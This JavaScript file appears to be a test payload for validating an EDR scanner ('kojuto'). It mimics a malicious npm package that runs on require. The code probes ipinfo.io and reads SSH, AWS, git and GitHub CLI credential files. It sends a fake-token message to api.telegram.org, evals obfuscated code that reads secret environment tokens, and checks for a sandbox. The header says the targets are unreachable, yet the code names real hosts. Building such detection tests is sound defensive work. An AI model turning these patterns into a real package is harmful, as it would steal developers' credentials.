/**
 * probe-npm — Import phase payload (require-time execution).
 *
 * !! TEST ARTIFACT FOR KOJUTO EDR VALIDATION !!
 * !! ALL TARGETS ARE UNREACHABLE (RFC 5737 / --network=none) !!
 * !! DO NOT PUBLISH TO npm !!
 *
 * Executes on `require('probe-npm')` during kojuto's import phase.
 * Runs 3x under simulated OS identities (Linux, Windows, macOS).
 *
 * TTPs exercised:
 *   - IP recon via connect (c2_communication)
 *   - Credential harvesting (credential_access)
 *   - Telegram exfil (c2_communication)
 *   - eval/Function/vm dynamic code exec (dynamic_code_execution)
 *   - Sandbox detection via /proc reads (evasion)
 */

'use strict';

const net = require('net');
const fs = require('fs');
const path = require('path');
const os = require('os');

const home = os.homedir();

// --- Recon ---

function recon() {
  try {
    const sock = new net.Socket();
    sock.setTimeout(2000);
    sock.connect(443, 'ipinfo.io', () => sock.destroy());
    sock.on('error', () => sock.destroy());
  } catch (_) {}
}

// --- Credential harvesting ---

function readCredentials() {
  const targets = [
    path.join(home, '.ssh', 'id_rsa'),
    path.join(home, '.aws', 'credentials'),
    path.join(home, '.git-credentials'),
    path.join(home, '.config', 'gh', 'hosts.yml'),
  ];

  for (const target of targets) {
    try { fs.readFileSync(target, 'utf8'); } catch (_) {}
  }
}

// --- Telegram exfil ---

function exfilTelegram() {
  try {
    const sock = new net.Socket();
    sock.setTimeout(2000);
    sock.connect(443, 'api.telegram.org', () => {
      sock.write('POST /bot0000000000:FAKE/sendMessage HTTP/1.1\r\n');
      sock.destroy();
    });
    sock.on('error', () => sock.destroy());
  } catch (_) {}
}

// --- Dynamic code execution (audit hook validation) ---

function dynamicExec() {
  // 1. eval of base64 payload
  try {
    const payload = Buffer.from(
      'cHJvY2Vzcy5lbnYuR0lUSFVCX1RPS0VO', 'base64'
    ).toString();
    // Decodes to: process.env.GITHUB_TOKEN
    eval(payload);
  } catch (_) {}

  // 2. Function constructor
  try {
    const fn = new Function('return process.env.AWS_SECRET_ACCESS_KEY');
    fn();
  } catch (_) {}

  // 3. vm.runInNewContext
  try {
    const vm = require('vm');
    vm.runInNewContext(
      'typeof process !== "undefined" && process.env.NPM_TOKEN',
      {}
    );
  } catch (_) {}
}

// --- Sandbox detection (evasion) ---

function sandboxDetect() {
  // Check /proc/self/status for TracerPid (strace detection)
  try { fs.readFileSync('/proc/self/status', 'utf8'); } catch (_) {}
  // Check /sys/class/net for --network=none
  try { fs.readdirSync('/sys/class/net'); } catch (_) {}
}

// --- Execute ---
recon();
readCredentials();
exfilTelegram();
dynamicExec();
sandboxDetect();
